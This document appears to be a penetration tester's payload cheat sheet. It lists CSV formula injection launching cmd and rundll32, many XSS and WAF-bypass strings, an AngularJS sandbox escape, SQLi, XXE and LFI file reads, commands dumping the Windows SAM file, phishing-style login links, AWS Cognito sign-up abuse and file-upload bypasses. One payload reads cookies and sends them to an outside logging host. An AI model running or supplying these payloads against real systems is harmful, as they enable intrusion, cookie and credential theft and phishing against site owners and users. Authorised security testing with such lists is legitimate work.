#test

## CSV inject
- DDE ("cmd";"/C calc";"!A0")A0
- =rundll32|'URL.dll,OpenURL calc'!A
- -1-rundll32|'URL.dll,OpenURL calc'!A
- =rundll32|'URL.dll,OpenURL notepad'!A
- =rundll32|'URL.dll,OpenURL https://google.com'!A1
- @SUM(1+1)*cmd|' /C calc'!A0
- =cmd|'/C calc'!A1@example.com //for emails
- =2+5+cmd|' /C calc'!A0
- +hack(cmd|'/c calc.exe'!A
- =hack/cmd|'/c calc.exe'!A
- -2+3+cmd|'/C calc'!A1
- -1-cmd|'/C calc'!'A1'
- --1-cmd|'/C calc'!'A1'
- =cmd|'/C notepad'!'A1'
- =cmd|'/C calc'!'A2'
- =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
- <TAB>=cmd|'/C notepad'!'A1' 
- <CR>=cmd|'/C notepad'!'A1'

rundll32 dll variations
- =rundll32|'shell32.dll,ShellExec_RunDLL calc'!A1
- =rundll32|'zipfldr.dll,RouteTheCall calc'!A1
- =rundll32|'shell32.dll,Control_RunDLL timedate.cpl'!A1
- =rundll32|'shell32.dll,Control_RunDLL appwiz.cpl'!A1

Abnormal Variations
- ending in coma: =cmd|'/c calc'!'a2',
- \t=\tc\tm\td\t|'/C notepad'!'A2',
- =\ncmd|'/C calc'!A1

Excel .xlsx breaks
- "=cmd|'/C calc'!'A1'"

- Parse breakers (defeats prefixed character mitigations)
  - shorter: parsebreaker" ;,=cmd|'/C notepad'!'A1'
  - parsebreaker",=cmd|'/C notepad'!'A1''" ;,=cmd|'/C notepad'!'A1'
  - csvi polyglot
    - =cmd|'/C notepad'!'A1';0x09=cmd|'/C notepad'!'A2',0x0D=cmd|'/C notepad'!'A3';=cmd|'/C notepad'!'A4'=cmd|'/C notepad'!'A5''" ;,=cmd|'/C notepad'!'A6' 
      - includes WAF bypass, new line hex characters to stop text scanners
    - =cmd|'/C notepad'!'A0';=cmd|'/C notepad'!'A1';0x09=cmd|'/C notepad'!'A2';-1-cmd|'/C notepad'!'A3';0x0D-1-cmd|'/C notepad'!'A4';=cmd|'/C notepad'!'A5'=cmd|'/C notepad'!'A6''" ;,=cmd|'/C notepad'!'A7' 
    - =cmd|'/C notepad'!'A1';0x09=cmd|'/C notepad'!'A2',\---1-cmd|'/C notepad'!'A3';@cmd|'/C notepad'!'A4'+cmd|'/C notepad'!'A5''" ;,=cmd|'/C notepad'!'A6'

      
- \---1-cmd|'/C calc'!'A1'
- \t--1-cmd|'/C calc'!'A1'
- \"--1-cmd|'/C calc'!'A1'
- \n--4-cmd|'/C calc'!'A1'

- excel special behavior
  - zero width marker: \u200B=cmd|' /C calc'!A0
  
- =HYPERLINK("file:///C:/Windows/System32/notepad.exe")
- +HYPERLINK("file:///C:/Windows/System32/notepad.exe")
- +HYPERLINK(CHAR(34)&file:///C:/Windows/System32/notepad.exe&CHAR(34))
- @HYPERLINK(CHAR(34)&"file:///C:/Windows/System32/notepad.exe"&CHAR(34))
- @HYPERLINK(\"file:///C:/Windows/System32/notepad.exe\")
- @HYPERLINK(""file:///C:/Windows/System32/notepad.exe"")
- =HYPERLINK("http://google.com", "Error: click to fix")
  - =HYPERLINK("https://google-web-pen-testing.vercel.app/", "Error: click to fix")
  - +HYPERLINK(\"http:\"&CHAR(47)&CHAR(47)&\"bing.com\"&CHAR(47)&\"payload\")
- =WEBSERVICE("http://google.com")
- =WEBSERVICE("https://google-web-pen-testing.vercel.app/")

//char obfuscation  ------------------------------------------------

//@HYPERLINK("file:///C:/Windows/System32/notepad.exe")
- @HYPERLINK(CHAR(102)&CHAR(105)&CHAR(108)&CHAR(101)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(67)&CHAR(58)&CHAR(47)&CHAR(87)&CHAR(105)&CHAR(110)&CHAR(100)&CHAR(111)&CHAR(119)&CHAR(115)&CHAR(47)&CHAR(83)&CHAR(121)&CHAR(115)&CHAR(116)&CHAR(101)&CHAR(109)&CHAR(51)&CHAR(50)&CHAR(47)&CHAR(110)&CHAR(111)&CHAR(116)&CHAR(101)&CHAR(112)&CHAR(97)&CHAR(100)&CHAR(46)&CHAR(101)&CHAR(120)&CHAR(101))


//filename
=HYPERLINK("google.com", "Error: click to fix") .csv

- advanced CSV/RCE/data exfil: https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection

### File name exploits
- file name csvi: @SUM(1+1)+cmd|' C calc'!A0.jpg
  - "; alert('XSS');//.jpg


## Easy for WAFs (if testing for mitigations and not fix)

```
<h1>yorha<h1>
<u>yorhaU</u>
<svg src=x onerror=confirm(document.domain)>
<script>alert(document.domain)</script>
/><script>alert(document.domain)</script>
<iframe src="javascript:alert(document.domain);"></iframe>
<button onclick="alert(document.domain)">Click me</button>
<a href="javascript:alert(document.domain)">Click me</a>
<img src=x onerror=confirm(document.domain)>
<xss onmousemove="alert(document.domain)">test</xss>
<xss onmouseleave="alert(document.domain)">test</xss>
<a/href="#"/oncut=prompt`1`>cutme</a>
<img srcset="x, data:image/svg+xml,%3Csvg/onload=alert(1)%3E 1x">
<a href="JaVaScRiPt%3Aalert(1)">test</a>
<a href="vbscript:msgbox(1)">test</a>

<form action="javascript:alert(1)" onsubmit="javascript:prompt(2)">
  <button type="submit" onclick="prompt`2`" onclick="prompt`3`" onclick="prompt`4`">Submit</button>
</form>

<form action="J\aV\a\s\cr\i\pt\::prompt`1`;http://" action="J\aV\a\s\cR\i\pT\::prompt`1`;http://" target="">
  <button type="submit" onclick="prompt`2`" onclick="prompt`3`" onclick="prompt`4`">Submit</button>
</form>

<scr<!--comment-->ipt>prompt(1)</scr<!--comment-->ipt>
<a href="$.getScript("ja\va\sc\ript:alert(1)");">haha</a>
```

## jquery basic xss
```js
//this can get external scripts 
$.getScript("javascript:alert(1)");
$.getScript('javascript:alert(1)');

$( "<img src=x onerror=alert(1)>" ).appendTo("body");
$().map(alert(1))

```

## HTML element escape

```js
foo'" onmouseenter="alert(document.domain)" bar
foo%27%22onmouseenter%3d%22%28alertdocument.domain%29%22%20bar%2ecom
foo'" onmousemove="alert(document.domain)" bar
foo'" onmouseenter="alert(document.domain)" bar.csv
foo'\" onmouseenter=\"alert(document.domain)\" bar.html

```


## modified
`
```js
//more less common
'"/><svg src=x onerror=confirm(document.domain)>
'"/><img src=x onerror=prompt(document.domain)>
'"/><img src=x onerror=prompt`document.domain`>
'&quot;&gt;&lt;img src=x onerror=prompt`document.domain`&gt;
&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;scri\pt&gt;confirm(1)&lt;/scri\pt&gt;

//emoji xss : explanation: https://medium.com/@fpatrik/how-i-found-an-xss-vulnerability-via-using-emojis-7ad72de49209
💋img src=x onerror=alert(document.domain)//💛



//sometimes things inside comments is ignored by parser
<!--'"/><img src=x onerror=prompt(document.domain)>
<!--'"/><svg src=x onerror=confirm(document.domain)>
<!--'\"/><img src=x onerror=prompt(document.domain)>
<!-- <textarea><img title="</textarea><img src=x onerror=alert()>"></textarea>
<!--<textarea><img title=\"</textarea><img src=x onerror=alert()>\"></textarea>
<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="confirm(document.domain)"></animate></svg>
<div style="background-image:url(javascript:confirm(document.domain))"></div>
<iframe src="data:text/html,<script>confirm(document.domain)</script>"></iframe>
<svgonload=alert(1)>
<svg/onerror=alert('XSS')>
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<audio src="JaVaScRiPt:cOnFiRm(1)"></audio>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<h1 style="background-color:red;background-image:url('javascript:confirm`1`')">B2<h1>
<h1 style="background-color:red;background-image:url('javascript:confirm(1)')">B2<h1>
```


```js
//URL filter bypasses
javascript:alert(document.domain);//https://
jAvAsCrIpT:prompt('xss');//https://www

//adam level bypass - replace the src to be an oastify
javascript:(async()=>{let t=(q=>{let d=document,w=globalThis;(new w.Image).src='https://www.aswsec.com/exploit/clogger.php?loc='+encodeURI(d.location)+'&dt='+encodeURI(new Date(Date.now()).toISOString())+'&cookie='+encodeURI(q.replace(/\+/g, "%252B"));});for(let s of ['cookieName1','cookieName2','cookieName3'])fetch('/plugins/react/pages/api?action=readCookie&cookieName='+s).then(r=>r.ok?r.json():null).then(d=>d&&t(s+'='+d.cookieValue)).catch(()=>{});})();//https://

//another adam bypass 2
javascript:parent.window.alert(document.domain);x=globalThis.parent.window.document.getElementsByName("__RequestVerificationToken")[0].value;document.writeln('REQUEST VERFICATION TOKEN IF NEEDED FOR EXPLOITING: ' +x);//https://www

//gareth heyes
#!@*%alert`1`
+!+[]

//polyglot test
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
//json safe
javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><svg\/onload='+\/\"`\/+\/onmouseover=1\/+\/[*/[]\/+alert(42);//'>

\j\av\a\s\cr\i\pt\:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>

//website or url fields
javascript:parent.window.alert(document.domain);x=globalThis.parent.window.document.getElementsByName("__RequestVerificationToken")[0].value;document.writeln('REQUEST VERFICATION TOKEN IF NEEDED FOR EXPLOITING: ' +x);//https://www

//template injections
{{7*7}}
{{7*7}}${{8*8}}{9*9}${2+2}


//basic
"><script>alert(1)</script>
"><!--`--><img src="x" onerror="alert(1)">
"><![CDATA[<img src="x" onerror="alert(1)">]]>

<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
<body onload=alert(document.domain)>
<iframe src="javascript:alert(document.domain)"></iframe>
<marquee onstart=alert(document.domain)>
<math><mtext><style><img src=x onerror=alert(document.domain)></mtext></math>
<a href="Ja&#x76;A&#x73;c&#x72;iPt:cOnfIrM(1)">break4</a>
<a data-info="<script>alert('XSS')</script>">Info</a>

//base64 for alert`1`
data:text/html;base64,YWxlcnRgMWA=
//base64 javascript polyglot
data:text/html;base64,amF2YXNjcmlwdDovKi0tPjwvdGl0bGU+PC9zdHlsZT48L3RleHRhcmVhPjwvc2NyaXB0PjwveG1wPjxzdmcvb25sb2FkPScrLyJgLysvb25tb3VzZW92ZXI9MS8rL1sqL1tdLythbGVydCg0Mik7Ly8nPg==
// %60 replace ` and / replaces spaces
<svg/onload%3dalert%602%60 trash%3d<!--
//if they filter out < > " 
%22%3E%3Cimg src=x onerror=alert(1) %3C!--

//if email:
mailto: test@example.com?subject=<script>alert(1)</script>
mailto:test@example.com?subject='+escape('<img src=x onerror=alert(1)>
```

## Markdown XSS
```js
//https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-in-markdown

<!-- Other links attacks with some bypasses -->
[Basic](javascript:alert('Basic'))
[Local Storage](javascript:alert(JSON.stringify(localStorage)))
[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
[URL](javascript://www.google.com%0Aalert('URL'))
[In Quotes]('javascript:alert("InQuotes")')
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
[Link](jaVaScRiPt:alert('XSS'))
[Link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

## Angularjs bypasses
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

- constructor.constructor('alert(1)')() 
- {{constructor.constructor('alert(1)')()}}
- {{constructor.constructor('alert(1)')()}}{{7*7}}
- ${constructor.constructor('alert(1)')()}
- {{constructor.constructor(`alert(document.domain)`)()}}
- {{constructor['constructor'](`alert(1)`)()}}


- https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
  - &toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
  - this breaks out of the AngularJS sandbox and becomes x=alert(1)



## dummy image
`https://raw.githubusercontent.com/thiem-dev/xssCat/main/tpen-safe-cat.jpg`

'"/><img src="https://raw.githubusercontent.com/thiem-dev/xssCat/main/tpen-safe-cat.jpg" onerror=prompt`document.domain`>

'"/><img src="http://mj96aqjvk4k9incbw2o252mia9g04tsi.oastify.com" onerror=alert`document.domain`>


# Sample

### rare xss:

```js
'-prompt(8)-' //for string append
"; alert('XSS');//  " //string append
¼script¾alert(¢XSS¢)¼script¾
‘; alert`1`;
eval`2+2`;

perl -e 'print XSS ' out   // this is probably not a perl type system but i wanted to try anyways
+ADw-script+AD4-alert`document.location`+ADw-script+AD4-
[{{alert;pg`XSS`}}] //template inject breakout

&#x3C;img src=x onerror=eval(String.fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))&#x3E;
```


## basic samples below

# basic SQLi
- https://portswigger.net/web-security/sql-injection/cheat-sheet 
- https://github.com/payloadbox/sql-injection-payload-list 

```sql
//examples
' OR '1'='1 
' or 1=1 limit 5 --
' UNION SELECT null, null, null; --
' OR 1=1; WAITFOR DELAY 
SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/ 
```

## XXE tests

```xml

Content-Type: application/xml
Content-Length: 194

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<data>
    <file>&xxe;</file>
</data>

```

## for CSS styles and color pickers
```js
// <span style=\"color: rgb(182, 255, 150); background-image: url('javascript:alert(1)');\">abc123-cssinject2</span>
// background-image: url('javascript:alert(1)');

```

## LFI - file traversal

`../../etc/passwd` 


###  LFI for all the different systems 
- Note not all the systems use .aspx (just notice the parameter to path and file exploitation with the systems)

Common LFI Payloads: If the application takes a file parameter, try injecting payloads that reference sensitive files on the system. For example:

/file.aspx?file=../../../../etc/passwd (for Linux systems)
/file.aspx?file=../../../../windows/win.ini (for Windows systems)
/file.aspx?file=../../../../appsettings.json (for .NET-based apps)

- Windows LFI
  - \\localhost\c$\Windows/debug/NetSetup.log

## MS and IIS equivalents


```json
//use these for requests to IIS servers

{
  "cmd": "net user"
}


{
  "cmd": "type C:\\Windows\\System32\\config\\SAM"
}
```

## HTML injection 
- below are ways to dodge the filters

```js

<a href="http://bing.com">YOUR SESSION HAS EXPIRED. Click here to login</a> 
<a href="https://google.com/">Click here to reset to reset password</a>
<a href="https://google-web-pen-testing.vercel.app/">Your session has expired. Click here to login</a>

&lt;a href="https://google.com/"&gt;Click here to reset password&lt;/a&gt;

//json safe
&lt;a href=\"https://google.com/\"&gt;Click here to reset password&lt;/a&gt; 

%3Ca%20href%3D%22https%3A%2F%2Fgoogle.com%2F%22%3EClick%20here%20to%20reset%20password%3C%2Fa%3E
```

## Rare 
- SSI
    - <!--#printenv -->

## AWS

### AWS buckets
- testing guide: https://blog.intigriti.com/hacking-tools/hacking-misconfigured-aws-s3-buckets-a-complete-guide 
- regex to find buckets `\.s3\.amazonaws\.com\/?`
  - or look for: `x-amz-bucket-region` `x-amz-request-id` `x-amz-id-2`
  - google dork: `site:.s3.amazonaws.com "company"`
  - Automated tools such as S3enum and cloud_enum can help you enumerate AWS S3 buckets
- bad configued bucket check cmds
  - `aws s3 ls s3://{BUCKET_NAME} --no-sign-request`

### cognito create new user
- https://security.theodo.com/en/blog/aws-cognito-pentest
  - the self-sign up shouldn't be misconfigured and the --no-sign-request should not be allowed either 
- if ever given aws credentials like these. 
  ```js 
    USER_POOL_ID: 'us-east-1_[redacted]',
    APP_CLIENT_ID: '[redacted]',
    IDENTITY_POOL_ID: 'us-east-1:[redacted]',
    IDP: '[org-redacted]-idm-saml-impl',

    //note this doesn't use aws-configure settings because all your commands override those
    //then use: 
    aws cognito-idp sign-up --client-id [redacted app-client-id] --username pentest12345@yopmail.com --password Password1234! --region us-east-1 --no-sign-request --user-attributes '[ {"Name":"email", "Value": "pentest12345@yopmail.com"}]'
  ```
  

## self note for file uploads
- you can do type stacking: .html.pdf
- null byte to dodge parser or WAF: .hta%00.pdf | ..pdf%00.hta
- Then changing the content type from pdf to html can sometimes cause it to open on the system if it is stored somewhere.
  ```js
  Content-Disposition: form-data; name="files[attachment]"; filename="tpen-js-pdf.html.pdf"
  Content-Type: application/pdf - > application/html
  ```
- file upload bypasses
  - when you see html form with `input accept=` change it to `accept = image/*` to bypass front end
  ```js
  //sometimes content type doesn't matter
  filename = 'sample.hta";.csv'
  Content-Type: application/vnd.ms-excel
  ```


## HTML Injection
- big payload list: https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Html-Injection-Payloads.txt 
```js

- <a/href="http:/bing.com"/style="height:100vh;width:100vw;position:fixed;top:-25px;left:-525px;">a
  - this is as short as I can have it to take over a whole page as a link
  - always also test for javascript: `<a/href="javascript:confirm(document.domain)"/style="height:100vh;width:100vw;position:fixed;top:-25px;left:-525px;">a`
  - also <iframe src="[oastify]">
  - <a href="http:/bing.com" style="height:100vh;width:100vw;position:fixed;top:-25px;left:-525px;">abc</a>
    - <a href="https://bing.com" style="background-color:green">abc</a>
  - <h1 style="background-color:red;background-image:url('javascript:confirm`1`')">B2<h1>
- <a href="http:/bing.com" style="height:30vh;width:30vw;position:fixed;top:-25px;left:-525px;background-color:green">abc</a>
<a href="http://bing.com/" style="height: 40vh; width: 40vw; border: 10px solid green;top:0px;left:0px;z-index:100;position:fixed;">abc</a>

<a href="javascript:prompt(1)" style="height: 40vh; width: 40vw; border: 10px solid green;top:0px;left:0px;position:fixed;z-index:100;">abc</a>
<link rel="icon" href="/favicon.ico">
<link rel="icon" href="javascript:confirm(1)">

```


## Favicon 
- Parameter Pollution
  - <link rel="icon" href="/favicon.ico">
  - <link rel="icon" href="/favicon.ico?theme=dark">
  - /index.html?icon=https://google.com/test.ico
- redirect to trusted resource inside page
- 


## DOM Clobbering
- def - requires an html injection we are using the id that is referenced by the page's original js. In a sense it's like "ID attribute poisoning"

```js
// Payload
<form id=x><output id=y>I've been clobbered</output>

// we are looking for an taking over references like
window.x 

// Sink
<script>alert(x.y.value);</script>

//other sinks 
eval(x.y.value);
document.write('<script>' + x.y.value + '</script>');
innerHTML = x.y.value
```


## the big1 XSS payload
```html
<a href=javascript:confirm(1) onclick=prompt(2)>Click</a>
<img src=x onerror=console.log(3)>
<input type=text onfocus=fetch('[oast]')>
<button onmouseover=document.write(4)>Hover</button>
<div onmousemove=localStorage.setItem('x',5)>storeX</div>
<form onsubmit=sessionStorage.setItem('y',6)>storeY<input type=submit></form>
<video oncanplay=console.error(7)><source src=x>play</video>
<svg onload=document.cookie='test=xss8'></svg>
<marquee onstart=document.location='javascript:alert(1)' onerror=console.info(1)>Test</marquee>
<details ontoggle=navigator.sendBeacon('/log',9)><summary>Click</summary></details>
<iframe src=javascript:open('https://bing.com?xss12')></iframe>
<svg><animate attributeName="x" begin="0s" dur="1s" repeatCount="indefinite" onbegin=console.warn(10)></animate></svg>
<body onresize=console.dir(11)></body>

```

### Big WAF bypass list
```js
<scr<script>ipt>alert(XSS)</scr<script>ipt> 
<sCrIpT>alert(XSS)</sCriPt> //changing the case of the tag
<<script>alert(XSS)</script> //prepending an additional "<"
<script>alert(XSS) // //removing the closing tag
<script>alert`XSS`</script> //using backticks instead of parenetheses
java%0ascript:alert(1) //using encoded newline characters
<iframe src=http://bing.com < //double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> //uncommon tags
<img/src=1/onerror=alert(0)> //bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> //extra characters
Function("ale"+"rt(1)")(); //using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 //octal encoding
<iframe src="javascript:alert(`xss`)"> //unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- //using comments in SQL query to break up statement
new Function`alt\`6\``; //using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ //base64 encoding the javascript
%26%2397;lert(1) //using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> //Using Line Feed (LF) line breaks
<BODY onload!//$%&()*~+-_.,:;?@[/|\]^`=confirm()> // use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
<a href="java%0ascript:confirm(document.domain)">haha</a>
```


## Things to Try

- cookiejar overflow: https://medium.com/@ibm_ptc_security/cookie-jar-overflow-attack-ae5135b6100
  - fill the app with so many junk cookies (past browser limit) it overwrites real cookies with ones that don't have the HTTPOnly flag
    - this is better in conjunction with xss

- Get company internal IPs via email (use the contact pages): https://medium.com/@far00t01/postmaster-thanks-for-the-internal-ip-2fcc1f4e541e 

- Basic IIS misconfigurations: https://medium.com/@far00t01/asp-net-microsoft-iis-pentesting-04571fb071a4
  - use : `GET /a.aspx HTTP/1.1` 

- Hyperlink injection: https://medium.com/@far00t01/hyperlink-injection-an-underrated-vulnerability-29e93bbd967b

- server-sided XSS: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf
    - can even read files

- prototype pollution: 
  - look for reflections in POST requests of objects. find object property names
  - add tye proto, and then try and break the json above it and see if the response reflects your input
      ```js

      //first try
      {
        "name":"sampleData",
        "isAdmin":true,
        "__proto__": {
          "status":500
        }
      }

      //second try
      {
        "name":"sampleData",
        "__proto__": {
          "status":500,
          "isAdmin":true
        }
      }

      //one liner
      user={__proto__:{toString:function(){alert("Prototype Pollution Detected")}}};
      ```
